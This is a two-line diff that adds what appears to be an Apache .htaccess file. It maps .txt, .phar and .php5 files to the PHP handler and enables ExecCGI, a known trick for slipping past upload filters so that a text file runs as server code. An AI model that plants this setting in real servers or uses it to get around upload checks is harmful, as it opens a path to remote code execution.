@@ -1,0 +1,2 @@
+AddType application/x-httpd-php .phar .php5 .txt
+Options +ExecCGI
